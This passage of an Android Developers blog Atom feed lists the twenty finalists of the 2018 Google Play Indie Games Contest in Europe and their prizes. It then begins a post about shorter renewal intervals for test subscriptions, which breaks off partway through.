    <category scheme="http://www.blogger.com/atom/ns#" term="android developers"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="business"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="competition"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="contest"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="developer"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Europe"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Games"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="grow"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="indie"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Indie Contest"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Indie games contest"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="indies"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="London"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="prizes"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Saatchi"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="showcase"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="win"/>
    <title type="text">Meet the finalists of the Google Play Indie Games Contest in Europe</title>
    <content type="html">&lt;em&gt;Posted by Adriana Puchianu, Developer Marketing Google Play&lt;/em&gt;

&lt;p&gt;
Back in October we launched the 2nd edition of the &lt;a
href="https://events.withgoogle.com/indie-games-contest-2017/"&gt;Google Play Indie
Games Contest in Europe&lt;/a&gt;, with the aim to identify, showcase and reward indie
gaming talent from more than 30 countries. We were amazed by the innovation and
creativity that indie developers from the region have to offer.
&lt;/p&gt;
&lt;p&gt;
Selecting just 20 finalists has once again been a huge challenge. We had a lot
of fun playing the games that will go on to showcase at the &lt;a
href="https://events.withgoogle.com/indie-games-contest-2017/final-event/#content"&gt;Saatchi
Gallery&lt;/a&gt; on &lt;strong&gt;February 13th&lt;/strong&gt; in London. Without further ado, we are happy
to announce the Top 20 finalists of this year's edition. Congratulations to the
finalists and thanks to everyone else who has entered the contest.
&lt;/p&gt;

&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://2.bp.blogspot.com/-LBypOT2nCAg/WlxBzZpRfaI/AAAAAAAAE9E/nAu2ZGQMnMQNnZ23p8vtnlIM-LIJmx_eACLcBGAs/s1600/image20.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-LBypOT2nCAg/WlxBzZpRfaI/AAAAAAAAE9E/nAu2ZGQMnMQNnZ23p8vtnlIM-LIJmx_eACLcBGAs/s1600/image20.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.tuesdayquest.myplanet&amp;e=-EnableAppDetailsPageRedesign"&gt;A
Planet of Mine&lt;/a&gt;
    &lt;br&gt;Tuesday Quest
    &lt;br&gt;France&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://2.bp.blogspot.com/-uGnPhgiTi_g/WlxB6FA9o-I/AAAAAAAAE9I/mBrEzFGEBnoMNbRl8NLddH1GF7bc1txlwCLcBGAs/s1600/image25.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-uGnPhgiTi_g/WlxB6FA9o-I/AAAAAAAAE9I/mBrEzFGEBnoMNbRl8NLddH1GF7bc1txlwCLcBGAs/s1600/image25.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.headupgames.bridgeconstructorportal&amp;e=-EnableAppDetailsPageRedesign"&gt;Bridge
Constructor Portal&lt;/a&gt;
    &lt;br&gt;ClockStone Softwareentwicklung GmbH
    &lt;br&gt;Austria&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://1.bp.blogspot.com/-O71xO3h41MM/WlxCU_m15JI/AAAAAAAAE9Q/Ytu7DQaRjkcMm2Lr-zOqigPwtqRy3qRpQCLcBGAs/s1600/image3.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-O71xO3h41MM/WlxCU_m15JI/AAAAAAAAE9Q/Ytu7DQaRjkcMm2Lr-zOqigPwtqRy3qRpQCLcBGAs/s1600/image3.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.plug_in_digital.emma&amp;e=-EnableAppDetailsPageRedesign"&gt;Bury
me, my Love&lt;/a&gt;
    &lt;br&gt;Playdius
    &lt;br&gt;France&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://2.bp.blogspot.com/-wQRjizNFw_M/WlxCq6fpZNI/AAAAAAAAE9U/DCXGUQGegLgI6kfLsMRA5ZCscFOChwxOgCLcBGAs/s1600/image31.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-wQRjizNFw_M/WlxCq6fpZNI/AAAAAAAAE9U/DCXGUQGegLgI6kfLsMRA5ZCscFOChwxOgCLcBGAs/s1600/image31.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.picodongames.CaptainTomGT&amp;e=-EnableAppDetailsPageRedesign"&gt;Captain
Tom Galactic Traveler&lt;/a&gt;
    &lt;br&gt;Picodongames
    &lt;br&gt;France&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;

&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-btQEOwc0j7c/WlxC9k1dFyI/AAAAAAAAE9c/ReGqiFzyyt0iirql9kOYkoNY-ijXQpPYgCLcBGAs/s1600/image30.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-btQEOwc0j7c/WlxC9k1dFyI/AAAAAAAAE9c/ReGqiFzyyt0iirql9kOYkoNY-ijXQpPYgCLcBGAs/s1600/image30.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
&lt;p&gt;
&lt;a
href="https://play.google.com/store/apps/details?id=am.fury.core&amp;e=-EnableAppDetailsPageRedesign"&gt;Core&lt;/a&gt;

&lt;br&gt;
FURYJAM

&lt;br&gt;
Russia
&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://3.bp.blogspot.com/-ir_k-otGXAQ/WlxDXPRxw5I/AAAAAAAAE9g/tMUIQm59lX46wjMewUhGXFxCJTg-Ysh4wCLcBGAs/s1600/image28.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-ir_k-otGXAQ/WlxDXPRxw5I/AAAAAAAAE9g/tMUIQm59lX46wjMewUhGXFxCJTg-Ysh4wCLcBGAs/s1600/image28.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.nitrome.flatpack_android&amp;hl=en&amp;e=-EnableAppDetailsPageRedesign"&gt;Flat
Pack&lt;/a&gt;
    &lt;br&gt;Nitrome
    &lt;br&gt;United Kingdom&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;

&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://1.bp.blogspot.com/-_UQJ3qhizt4/WlxDkuM6s6I/AAAAAAAAE9o/HEujegTQfBIa-QnHwRIxOO5Ld0zJic9fACLcBGAs/s1600/image12.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-_UQJ3qhizt4/WlxDkuM6s6I/AAAAAAAAE9o/HEujegTQfBIa-QnHwRIxOO5Ld0zJic9fACLcBGAs/s1600/image12.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=pl.macaque.FernFlower"&gt;Fern
Flower &lt;/a&gt;
    &lt;br&gt;Macaque
    &lt;br&gt;Poland&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://1.bp.blogspot.com/-GHqgsN4YupU/WlxDpSSDKeI/AAAAAAAAE9s/pX15qKLHxXEfBoJoyM1QuenUiewgxMLLgCLcBGAs/s1600/image22.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-GHqgsN4YupU/WlxDpSSDKeI/AAAAAAAAE9s/pX15qKLHxXEfBoJoyM1QuenUiewgxMLLgCLcBGAs/s1600/image22.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.zutgames.ilovehue&amp;e=-EnableAppDetailsPageRedesign"&gt;I
Love Hue&lt;/a&gt;
    &lt;br&gt;Zut!
    &lt;br&gt;United Kingdom&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;




&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-fHQHPkS84CM/WlxEJsf-00I/AAAAAAAAE90/GOeHJQhRKaI-mKR0P0Vk4uog4NyojN5cwCLcBGAs/s1600/image6.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-fHQHPkS84CM/WlxEJsf-00I/AAAAAAAAE90/GOeHJQhRKaI-mKR0P0Vk4uog4NyojN5cwCLcBGAs/s1600/image6.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=air.com.gamebrain.jodeo"&gt;Jodeo&lt;/a&gt;

    &lt;br&gt;Gamebra.in
    &lt;br&gt;Turkey&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://2.bp.blogspot.com/-rJD3m6qhqBY/WlxEPm_4FWI/AAAAAAAAE94/Faypa_d9sZ8y0FeHw2HjdMKldSom8fgaACLcBGAs/s1600/image18.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-rJD3m6qhqBY/WlxEPm_4FWI/AAAAAAAAE94/Faypa_d9sZ8y0FeHw2HjdMKldSom8fgaACLcBGAs/s1600/image18.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.stateofplaygames.kami2"&gt;Kami
2&lt;/a&gt;

    &lt;br&gt;State of Play
    &lt;br&gt;United Kingdom&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;




&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://3.bp.blogspot.com/-zLagT28CDO8/WlxEotuR7vI/AAAAAAAAE-E/gXJ38IzqAkM4W6DgxkhmEXjjHFuRmrlkQCLcBGAs/s1600/image16.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-zLagT28CDO8/WlxEotuR7vI/AAAAAAAAE-E/gXJ38IzqAkM4W6DgxkhmEXjjHFuRmrlkQCLcBGAs/s1600/image16.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt; &lt;a
href="https://play.google.com/store/apps/details?id=com.fiftytwo.kensho_android&amp;e=-EnableAppDetailsPageRedesign"&gt;Kenshō&lt;/a&gt;
    &lt;br&gt;FIFTYTWO
    &lt;br&gt;Russia&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-390eoy1M8z8/WlxEuSCecaI/AAAAAAAAE-I/v5tBWHIsA-MIIHPaGWsyWRak73bjHVPWwCLcBGAs/s1600/image10.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-390eoy1M8z8/WlxEuSCecaI/AAAAAAAAE-I/v5tBWHIsA-MIIHPaGWsyWRak73bjHVPWwCLcBGAs/s1600/image10.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.tommysoereide.NoMoreButtons&amp;e=-EnableAppDetailsPageRedesign"&gt;No
More Buttons&lt;/a&gt;
    &lt;br&gt;Tommy Søreide Kjær
    &lt;br&gt;Norway&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;




&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://1.bp.blogspot.com/-NCAP9CDH5ws/WlxFC-sJfaI/AAAAAAAAE-M/X8B-oxzc4g0WquWdK9ohjrGqQNMdGL44ACLcBGAs/s1600/image29.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-NCAP9CDH5ws/WlxFC-sJfaI/AAAAAAAAE-M/X8B-oxzc4g0WquWdK9ohjrGqQNMdGL44ACLcBGAs/s1600/image29.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt; &lt;a
href="https://play.google.com/store/apps/details?id=es.brokenrul.oldmansjourney&amp;e=-EnableAppDetailsPageRedesign"&gt;Old
Man's Journey&lt;/a&gt;
    &lt;br&gt;Broken Rules Interactive Media GmbH
    &lt;br&gt;Austria&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-Ws0glE9KrPc/WlxFG0DNoUI/AAAAAAAAE-Q/DHWUpDA6BhsOH_Iqgbbp8fdephZ5BzeWwCLcBGAs/s1600/image19.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-Ws0glE9KrPc/WlxFG0DNoUI/AAAAAAAAE-Q/DHWUpDA6BhsOH_Iqgbbp8fdephZ5BzeWwCLcBGAs/s1600/image19.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.develobster.ra2"&gt;Radium 2 | Ra²&lt;/a&gt;
    &lt;br&gt;Developster
    &lt;br&gt;Germany&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;



&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-abXQjnyF5xY/WlxGIvcVT9I/AAAAAAAAE-g/nRmu0-3ttoAg7Lx1dcTtcxgNF3SQlVtsgCLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-abXQjnyF5xY/WlxGIvcVT9I/AAAAAAAAE-g/nRmu0-3ttoAg7Lx1dcTtcxgNF3SQlVtsgCLcBGAs/s1600/image2.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.armorgames.thebigjourney.android&amp;hl=en_GB"&gt;The
Big Journey&lt;/a&gt;
    &lt;br&gt;Catfishbox
    &lt;br&gt;Ukraine&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://3.bp.blogspot.com/-fmbIOn8Ld6k/WlxGMwxcEOI/AAAAAAAAE-k/MpYYlB48LIEVJOWmbmkBN0Sp9V9S149cACLcBGAs/s1600/image14.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-fmbIOn8Ld6k/WlxGMwxcEOI/AAAAAAAAE-k/MpYYlB48LIEVJOWmbmkBN0Sp9V9S149cACLcBGAs/s1600/image14.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.bluebraingames.thehouseofdavinci&amp;e=-EnableAppDetailsPageRedesign"&gt;The
House of Da Vinci&lt;/a&gt;
    &lt;br&gt;Blue Brain Games, s.r.o.
    &lt;br&gt;Slovakia&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;



&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-GI647vEsxxc/WlxGnlPrVYI/AAAAAAAAE-s/KeZoXnzkgy0yjXdoX1_WyagR7rjHgG9rACLcBGAs/s1600/image23.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-GI647vEsxxc/WlxGnlPrVYI/AAAAAAAAE-s/KeZoXnzkgy0yjXdoX1_WyagR7rjHgG9rACLcBGAs/s1600/image23.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.sheep.theofficequest&amp;e=-EnableAppDetailsPageRedesign"&gt;The
Office Quest&lt;/a&gt;
    &lt;br&gt;11Sheep
    &lt;br&gt;Israel&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://2.bp.blogspot.com/-fDwVMMQF158/WlxGqZU0GyI/AAAAAAAAE-w/Rp8MxvmhO9QwsGJjmn_Lkkv83y_d0DiJQCLcBGAs/s1600/image8.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-fDwVMMQF158/WlxGqZU0GyI/AAAAAAAAE-w/Rp8MxvmhO9QwsGJjmn_Lkkv83y_d0DiJQCLcBGAs/s1600/image8.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.tvee.unbalance&amp;e=-EnableAppDetailsPageRedesign"&gt;Unbalance&lt;/a&gt;
    &lt;br&gt;TVEE
    &lt;br&gt;Turkey&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;




&lt;div class="indieflex"&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://4.bp.blogspot.com/-J7YvDy8prBE/WlxHEYSITgI/AAAAAAAAE-0/wD0HSb_HXakCk6kn9KgzxJEpxnn2ks7-wCLcBGAs/s1600/image32.png" imageanchor="1" &gt;&lt;img border="0" src="https://4.bp.blogspot.com/-J7YvDy8prBE/WlxHEYSITgI/AAAAAAAAE-0/wD0HSb_HXakCk6kn9KgzxJEpxnn2ks7-wCLcBGAs/s1600/image32.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.Undervault&amp;e=-EnableAppDetailsPageRedesign"&gt;Undervault&lt;/a&gt;
    &lt;br&gt;Andriy Bychkovskyi
    &lt;br&gt;Ukraine&lt;/p&gt;
  &lt;/div&gt;
  &lt;div class="indiefleximg"&gt;
&lt;a href="https://3.bp.blogspot.com/-m2vxxw-W4lY/WlxHHgXNnRI/AAAAAAAAE-8/i5fr8aZxAY0B4TIULkfIqGD6xFc_dyI9wCLcBGAs/s1600/image27.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-m2vxxw-W4lY/WlxHHgXNnRI/AAAAAAAAE-8/i5fr8aZxAY0B4TIULkfIqGD6xFc_dyI9wCLcBGAs/s1600/image27.png" data-original-width="512" data-original-height="512" /&gt;&lt;/a&gt;
    &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=air.com.bartbonte.yellow&amp;e=-EnableAppDetailsPageRedesign"&gt;yellow&lt;/a&gt;
    &lt;br&gt;Bart Bonte
    &lt;br&gt;Belgium&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;h3&gt;Check out the prizes&lt;/h3&gt;
&lt;p&gt;
All the 20 finalists are getting:
&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;A paid trip to London to showcase their game at the Final held at Saatchi
Gallery&lt;/li&gt;
&lt;li&gt;Inclusion of their game on a promotional billboard in London for 1 month&lt;/li&gt;
&lt;li&gt;Inclusion of their game in a dedicated Indie Games Contest collection on the
Indie Corner for one month in more than 40 countries across EMEA&lt;/li&gt;
&lt;li&gt;Two (2) tickets to attend a 2018 Playtime event, an invitation-only event
for top apps and games developers on Google Play&lt;/li&gt;
&lt;li&gt;One (1) Pixel 2 device&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;
They will also have the chance to win &lt;a
href="https://events.withgoogle.com/indie-games-contest-2017/prizes/#content"&gt;more
prizes&lt;/a&gt; at the final event.
&lt;/p&gt;
&lt;h3&gt;Join the Google Play team and the finalists at the final event:&lt;/h3&gt;
&lt;p&gt;
Anyone can now &lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLSeuSgMmw5hvh1tNrVyTGZkNa6Wpt9tmBfQWrxTkYzWG_oRfsg/viewform"&gt;register&lt;/a&gt;
to attend the &lt;a
href="https://events.withgoogle.com/indie-games-contest-2017/final-event/#content"&gt;final
showcase event&lt;/a&gt; for free at the Saatchi Gallery in London on &lt;strong&gt;13
February 2018&lt;/strong&gt;. Come and play some great games and have fun with indie
developers, industry experts, and the Google Play team.
&lt;/p&gt;
&lt;center&gt;
How useful did you find this blogpost?
&lt;/center&gt;
&lt;center&gt;
&lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=playtime-10/17" style="color:gold;"&gt;★&lt;/a&gt;
&lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=playtime-10/17" style="color:gold;"&gt;★&lt;/a&gt;
&lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=playtime-10/17" style="color:gold;"&gt;★&lt;/a&gt;
&lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=playtime-10/17" style="color:gold;"&gt;★&lt;/a&gt;
&lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=playtime-10/17" style="color:gold;"&gt;★&lt;/a&gt;
&lt;/center&gt;

&lt;a href="https://4.bp.blogspot.com/-Nq0Wj2lZb7Q/WlxL5Ckr1LI/AAAAAAAAE_I/EFPl-_juwCECmoKWOkrHT-PD45uYcKdHACLcBGAs/s1600/image5.png" imageanchor="1" &gt;&lt;img class="playlogo" border="0" src="https://4.bp.blogspot.com/-Nq0Wj2lZb7Q/WlxL5Ckr1LI/AAAAAAAAE_I/EFPl-_juwCECmoKWOkrHT-PD45uYcKdHACLcBGAs/s1600/image5.png" data-original-width="499" data-original-height="281" /&gt;&lt;/a&gt;
&lt;style&gt;

.indieflex {
display: flex;
width: 100%;
justify-content: space-around;
align-items: center;
text-align: center;
padding: 0;
border: 0;
margin: 0;
}

.indiefleximg img {
width: 45%;
margin: 10px 0 0 0;
}

.playlogo {
display: block;
width: 30%;
margin: auto !important;
padding: 0;
border: 0;
}

#main .post-content br {
padding: 0;
}

&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=fVLPihagg0Q:Gw77YQJkZk8:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=fVLPihagg0Q:Gw77YQJkZk8:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=fVLPihagg0Q:Gw77YQJkZk8:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/fVLPihagg0Q" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/6612720546587004175"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/6612720546587004175"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/fVLPihagg0Q/meet-finalists-of-google-play-indie.html" title="Meet the finalists of the Google Play Indie Games Contest in Europe"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://2.bp.blogspot.com/-LBypOT2nCAg/WlxBzZpRfaI/AAAAAAAAE9E/nAu2ZGQMnMQNnZ23p8vtnlIM-LIJmx_eACLcBGAs/s72-c/image20.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/meet-finalists-of-google-play-indie.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-1576392998479627904</id>
    <published>2018-01-12T19:46:00.003-08:00</published>
    <updated>2018-01-16T09:45:15.011-08:00</updated>
    <title type="text">Faster Renewals for Test Subscriptions</title>
    <content type="html">&lt;p&gt;
Testing your in-app subscriptions is a critical step in ensuring you're offering
your customers a high quality service.
&lt;/p&gt;
&lt;p&gt;
In order to make testing easier and faster, &lt;strong&gt;starting on February
20th&lt;/strong&gt;, we are introducing shorter renewal intervals for test purchases
made with license-test accounts. Currently, subscriptions by license-test
accounts renew daily. The new changes will allow you to test an entire
subscription cycle, including 6 renewals, in under an hour. We will also be
shortening the testing time intervals of features such as grace period and
account hold.
&lt;/p&gt;
&lt;p&gt;
Please be aware that these changes are coming so you can update your testing
flows accordingly prior to the change. Also note that existing test
subscriptions still active on February 20, 2018 will automatically be canceled
at that time.
&lt;/p&gt;
&lt;h3&gt;Renewal times&lt;/h3&gt;
&lt;p&gt;
Renewal times will vary based on the subscription period:
&lt;/p&gt;
&lt;table class="renewals"&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;strong&gt;Subscription period&lt;/strong&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;strong&gt;Test subscription period&lt;/strong&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;1 week
   &lt;/td&gt;
   &lt;td&gt;5 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;1 month
   &lt;/td&gt;
   &lt;td&gt;5 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;3 month
   &lt;/td&gt;
   &lt;td&gt;10 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;6 month
   &lt;/td&gt;
   &lt;td&gt;15 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;1 year
   &lt;/td&gt;
   &lt;td&gt;30 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;
Time intervals of the following features will also be shortened for test
subscriptions:
&lt;/p&gt;
&lt;table class="renewals"&gt;
  &lt;tr&gt;
   &lt;td&gt;&lt;strong&gt;Feature&lt;/strong&gt;
   &lt;/td&gt;
   &lt;td&gt;&lt;strong&gt;Test period&lt;/strong&gt;
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;Free trial
   &lt;/td&gt;
   &lt;td&gt;3 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;Introductory price period
   &lt;/td&gt;
   &lt;td&gt;Same as test subscription period
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;Grace period (both 3 and 7 day)
   &lt;/td&gt;
   &lt;td&gt;5 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
   &lt;td&gt;Account hold
   &lt;/td&gt;
   &lt;td&gt;10 minutes
   &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;p&gt;
&lt;strong&gt;Note: &lt;/strong&gt;These times are approximate; you may see some small
variations in the precise time of an event. To compensate for variation, call
the &lt;a
href="https://developers.google.com/android-publisher/api-ref/purchases/subscriptions"&gt;Google
Play Developer API&lt;/a&gt; to view current status after every subscription
expiration date.
&lt;/p&gt;
&lt;h3&gt;Renewal limit&lt;/h3&gt;
&lt;p&gt;
Due to the increase in renewal frequency, the number of renewals is limited to 6
regular renewals (not including intro price/free trial). After 6 renewals, the
subscription will be automatically canceled.
&lt;/p&gt;
&lt;h3&gt;Examples&lt;/h3&gt;
&lt;p&gt;
Here are several examples of how the new renewal times are applied.
&lt;/p&gt;

&lt;h2&gt;Free trial&lt;/h2&gt;

